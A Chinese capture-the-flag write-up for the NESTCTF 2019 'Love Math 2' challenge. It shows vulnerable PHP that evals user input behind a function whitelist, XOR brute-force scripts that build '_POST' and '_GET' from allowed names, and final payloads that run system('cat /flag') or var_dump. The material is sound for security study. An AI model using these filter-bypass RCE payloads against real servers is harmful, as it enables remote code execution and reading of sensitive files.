# \[NESTCTF 2019]Love Math 2

## \[NESTCTF 2019]Love Math 2

## 考点

* 根据白名单构造RCE字符串
* 类似于无字符RCE的构造思路

## wp

本题代码如下

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 60) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

[\[CISCN 2019 初赛\]Love Math](ciscn-2019-chu-sai-love-math.md)的白名单和本题对比如下

```
$whitelist1 = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
$whitelist2 = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
```

已知条件:

* 白名单不包含base\_convert和dechex
* c 的长度小于 60
* 其余和[\[CISCN 2019 初赛\]Love Math](ciscn-2019-chu-sai-love-math.md)保持相同

### 第一种方法

本题就使用异或解决

```php
<?php
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    
foreach($whitelist as $w){
    for($a=1;$a<999999;$a++){
        $res = $w ^ decoct($a);
        if(strpos($res,"_POST")===0){
            echo $w.'   '.$a.'   ';
            echo $res;
            echo "<br>";
        }
    }
}
```

得到结果`hexdec 31737 _POST`

最终 payload: GET `?c=$pi=${(hexdec^decoct(31737))};$pi{pow}($pi{abs});` POST `pow=system&abs=cat /flag`

### 第二种方法

或者用另一种方式异或

这个正则只是不允许字母前后有数字，可以使用括号分隔数字，再用`.`拼接，再用数字字符串进行异或

然后爆破出异或26个字母的方法，然后删除重复的，分类一下，就可以得到编码表

```php
<?php
$a = array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','(',')','$');

$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];

foreach($a as $i){
	foreach($whitelist as $t){
		foreach(str_split($t) as $j){
			$tmp = (string)$i^(string)$j;
			if($tmp === '_'){
				echo "$i^$j=".((string)$i ^ (string)$j). "<br>";
				continue;
			}
			if(ord('a')<=ord($tmp)&&ord($tmp)<=ord('z')){
				echo "$i^$j=".((string)$i ^ (string)$j). "<br>";
				continue;
			}
			if(ord('A')<=ord($tmp)&&ord($tmp)<=ord('Z')){
				echo "$i^$j=".((string)$i ^ (string)$j). "<br>";
				continue;
			}
		}
	}
}

```

部分编码表

```
1^n=_	1^v=G	1^t=E	d^0=T
2^m=_	2^u=G	2^w=E	e^1=T
3^l=_	3^t=G	3^v=E	f^2=T
6^i=_	4^s=G	4^q=E	1^e=T
7^h=_	5^r=G	5^p=E	2^f=T
8^g=_	6^q=G	6^s=E	3^g=T
9^f=_	7^p=G	7^r=E	5^a=T
0^o=_	0^w=G	0^u=E	6^b=T
(^w=_	(^o=G	(^m=E	7^c=T
)^v=_	)^n=G	)^l=E	8^l=T
	$^c=G	$^a=E	9^m=T
			0^d=T
			$^p=T
```

根据如上内容，不难构造出语句

* `(2).(3)^mt_rand` 是 `_G`
* `(1).(5)^tanh` 是 `ET`

最终 payload如下，本地是可以用的，题目好像不行

```
?c=$pi=((2).(3)^mt_rand).((1).(5)^tanh);$$pi{0}($$pi{1})&0=var_dump&1=123
```

